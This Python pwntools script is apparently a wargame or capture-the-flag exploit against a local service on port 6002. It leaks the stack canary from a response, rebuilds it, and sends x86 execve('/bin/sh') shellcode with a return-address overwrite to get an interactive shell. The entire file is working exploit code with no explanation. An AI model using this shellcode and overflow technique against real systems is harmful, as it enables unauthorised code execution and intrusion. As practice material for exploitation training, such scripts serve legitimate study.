#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *
import tty

NOP_OPERATOR = '\x90'
SHELLCODE = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

def main():
    target = "localhost"
    port = "6002"

    buffer = p32(0xffffdda0)

    r = remote( target, port )

    response = r.recv( 1000, timeout=2 )
    print response

    print "[+] Sending message"

    r.send( "A" * 16 )
    # response = r.recv( 4000, timeout=2 )
    response = r.recvrepeat(0.2)
    print "resp: ", response

    h_r = response.encode('hex')
    print "hex response: ", h_r, h_r[106:106+16]
    canary = h_r[106:106+16]
    high_canary = int("0x{}".format(canary[:8]), 16)
    low_canary = int("0x{}".format(canary[8:]), 16)

    print canary
    print "0x{}".format(canary[:8]), "0x{}".format(canary[8:])

    r.send( SHELLCODE + "A" * 22 + "\x00" + str(p32(high_canary, endian='big')) + str(p32(low_canary, endian='big')) + "\x00" + "A" * 19 + str(buffer) )
    r.interactive()

    print "[+] END"

if __name__ == '__main__':
    main()
# 546869732069732074686520393434372077617267616d696e6720676174657761792c2041414141414141414141414141414141

# c25bae74e987bc06
